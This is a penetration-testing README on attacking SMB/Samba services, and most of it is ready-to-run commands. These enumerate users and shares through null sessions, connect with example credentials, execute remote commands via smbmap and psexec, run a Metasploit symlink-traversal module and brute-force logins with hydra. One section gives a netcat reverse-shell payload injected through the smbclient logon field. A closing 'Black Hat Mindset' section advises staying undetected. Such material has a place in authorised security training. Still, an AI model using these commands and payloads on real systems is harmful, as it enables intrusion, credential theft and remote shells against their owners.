# Basic Methodology - Ports 137, 139, 445 (SMB-Samba)

This README explores exploiting SMB (Server Message Block) and Samba services, focusing on version enumeration, share enumeration, command execution, reverse shells, and vulnerability exploitation.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [SMB/Samba Version Enumeration](#smbsamba-version-enumeration)
- [Enum4linux Enumeration](#enum4linux-enumeration)
- [NetBIOS Scan](#netbios-scan)
- [RPCclient Null Session](#rpcclient-null-session)
- [Smbclient Share Enumeration](#smbclient-share-enumeration)
- [Smbclient Share Connection](#smbclient-share-connection)
- [SMBMap Enumeration and Command Execution](#smbmap-enumeration-and-command-execution)
- [SMB Reverse Shell](#smb-reverse-shell)
- [Psexec Exploitation](#psexec-exploitation)
- [Nmap NSE Scripts](#nmap-nse-scripts)
- [Symlink Directory Traversal](#symlink-directory-traversal)
- [Brute-Force Attacks](#brute-force-attacks)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

SMB/Samba on ports 137, 139, and 445 facilitates file and printer sharing in Windows and Linux environments but is often a target for attackers due to misconfigurations, weak credentials, or unpatched vulnerabilities. This guide covers enumerating SMB services, accessing shares, executing commands, and exploiting vulnerabilities like symlink traversal.

## Setup and Prerequisites

- **Environment**: Linux host with network access to the target SMB/Samba server.
- **Tools**: Install `smbclient`, `rpcclient`, `smbmap`, `nbtscan`, `enum4linux`, `nmap`, `hydra`, `metasploit-framework`, and Impacket (`psexec.py`).
- **Wordlists**: Prepare a password file (e.g., `password-file.txt`) or use `/usr/share/wordlists/rockyou.txt`.
- **IP Address**: Identify the target IP address (e.g., `<IP address>`).
- **Credentials**: Have guessed or compromised credentials (e.g., `administrator:asdf1234`, `ariley:P@$$w0rd1234!`).

## SMB/Samba Version Enumeration

Identify the SMB/Samba version to find potential vulnerabilities.

```bash
sudo ./smbver.sh <IP address> <port>
```

*Note: Ensure smbver.sh is in your working directory and executable (`chmod +x smbver.sh`).*

## Enum4linux Enumeration

Perform comprehensive SMB enumeration.

```bash
enum4linux -a <IP address>
```

Example Output:
```
Users: administrator, guest
Shares: IPC$, ADMIN$, C$
```

## NetBIOS Scan

Enumerate NetBIOS names and details.

```bash
nbtscan <IP address>
```

Example Output:
```
IP address       NetBIOS Name     Server    User
192.168.1.100    WIN-SERVER       <server>  ADMINISTRATOR
```

## RPCclient Null Session

Connect to the SMB server without credentials.

```bash
rpcclient -U "" <IP address>
```

Example Commands:
```bash
rpcclient> enumdomusers    # Lists domain users
rpcclient> enumdomgroups   # Lists domain groups
```

## Smbclient Share Enumeration

List available shares on the SMB server.

```bash
smbclient -L //<IP address>
```

Example Output:
```
Sharename       Type      Comment
---------       ----      -------
IPC$            IPC       Remote IPC
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
```

## Smbclient Share Connection

Connect to a specific share.

```bash
smbclient //<IP address>/<share>
```

With Credentials:
```bash
smbclient -U administrator%asdf1234 //<IP address>/C$
smbmap -H 192.168.12.123 -u administrator -p asdf1234
```

## SMBMap Enumeration and Command Execution

Enumerate shares and execute commands.

```bash
smbmap -H <IP address>
smbmap -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group "Domain Admins" /domain' -H 192.168.2.50
```

## SMB Reverse Shell

Establish a reverse shell via SMB.

```bash
smb: \> logon "/=nc -e /bin/sh"
```

Setup:
```bash
# On attacker:
nc -lvnp <port>

# On target: Run the logon command in an smbclient session
```

## Psexec Exploitation

Gain a shell using psexec.

```bash
python psexec.py pentest:'P3nT3st!'@<IP address>
```

## Nmap NSE Scripts

Scan for SMB/Samba vulnerabilities.

```bash
ls -la /usr/share/nmap/scripts | grep "smb"     # Lists SMB-related NSE scripts
ls -la /usr/share/nmap/scripts | grep "samba"   # Lists Samba-related scripts
```

Example usage:
```bash
nmap -p 445 --script smb-vuln* <IP address>      # Scans for SMB vulnerabilities like MS17-010
nmap -p 445 --script smb-enum-shares <IP address> # Enumerates shares
```

## Symlink Directory Traversal

Exploit Samba symlink traversal vulnerabilities.

```bash
msf > use auxiliary/admin/smb/samba_symlink_traversal
```

Steps:
```bash
set RHOST <IP address>
set SHARE <share_name>
set SMB_DIR /etc
exploit    # Attempts to access /etc via the share
```

## Brute-Force Attacks

Guess SMB credentials.

```bash
hydra -l root -P password-file.txt <IP address> smb
```

Alternative:
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt <IP address> smb -t 4
```

## Black Hat Mindset

- **Enumerate Thoroughly**: Use enum4linux and smbmap to map shares, users, and permissions.
- **Exploit Misconfigs**: Target null sessions or weak credentials for quick access to shares.
- **Execute Commands**: Leverage smbmap or psexec to run commands and escalate privileges.
- **Stay Undetected**: Use minimal brute-force attempts and proxy connections to avoid detection.

## Resources

- SMB Protocol
- Enum4linux GitHub
- Smbmap GitHub
- Impacket Guide
- Nmap NSE Documentation

